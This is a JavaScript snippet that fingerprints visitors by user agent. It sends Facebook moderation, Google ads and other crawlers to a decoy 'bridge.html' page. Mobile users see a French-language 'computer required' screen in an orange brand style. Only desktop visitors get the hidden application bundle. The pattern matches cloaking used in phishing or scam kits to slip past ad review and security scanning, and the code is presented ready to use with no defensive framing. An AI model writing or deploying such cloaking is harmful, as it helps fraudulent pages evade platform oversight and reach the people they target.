(function () {
  var ua = navigator.userAgent || "";
  var uaLower = ua.toLowerCase();
  var bots = [
    "facebookexternalhit",
    "facebookcatalog",
    "moderateur",
    "googlebot",
    "adsbot-google",
    "mediapartners-google",
    "google-inspectiontool",
    "storebot-google",
    "googleother",
    "feedfetcher-google",
    "apis-google",
    "bingbot",
    "bingpreview",
    "adidxbot",
    "msnbot",
    "microsoftpreview",
    "applebot",
  ];
  var CRAWLER_HINT =
    /googlebot|bingbot|adsbot|applebot|facebookexternalhit|facebookcatalog|mediapartners|feedfetcher|storebot|google-inspection|googleother|apis-google|bingpreview|adidxbot|msnbot|microsoftpreview|applebot|moderateur|bot\.html|spider|crawl/i;

  function isRealBrowser(userAgent) {
    var l = userAgent.toLowerCase();
    if (CRAWLER_HINT.test(l)) return false;
    return (
      /mozilla\/5\.0/.test(l) &&
      /(?:chrome\/|crios\/|edg\/|firefox\/|version\/)/.test(l)
    );
  }

  function isBot(userAgent) {
    if (isRealBrowser(userAgent)) return false;
    var l = userAgent.toLowerCase();
    return bots.some(function (bot) {
      return l.indexOf(bot) !== -1;
    });
  }

  var MOBILE_PATTERN =
    /android|webos|iphone|ipad|ipod|blackberry|iemobile|opera mini|mobile|phone|tablet|kindle|silk|fennec|windows phone|windows ce|playbook|bb10|meego|mobi|palm|symbian/i;

  if (isBot(ua)) {
    window.location.replace("bridge.html");
    return;
  }

  function isDesktop() {
    if (MOBILE_PATTERN.test(ua)) return false;
    if (navigator.userAgentData && navigator.userAgentData.mobile) return false;
    if (window.matchMedia("(max-width: 1024px)").matches) {
      if (window.matchMedia("(pointer: coarse)").matches) return false;
      if (navigator.maxTouchPoints > 0 && window.innerWidth < 1025) return false;
    }
    return true;
  }

  if (!isDesktop()) {
    document.documentElement.lang = "fr";
    document.body.innerHTML =
      '<main style="min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f3f4f6;font-family:Segoe UI,Arial,sans-serif;padding:24px">' +
      '<div style="max-width:420px;background:#fff;border:1px solid #e5e7eb;border-top:4px solid #FF7900;border-radius:12px;padding:28px;text-align:center;box-shadow:0 8px 24px rgba(0,0,0,.08)">' +
      '<h1 style="font-size:20px;margin-bottom:12px;color:#FF7900">Ordinateur requis</h1>' +
      '<p style="font-size:15px;line-height:1.55;color:#4b5563">Ce site est accessible uniquement depuis un ordinateur (PC ou Mac). Veuillez ouvrir cette page sur un poste fixe ou portable.</p>' +
      "</div></main>";
    return;
  }

  var s = document.createElement("script");
  s.src = "__APP_BUNDLE__";
  document.body.appendChild(s);
})();
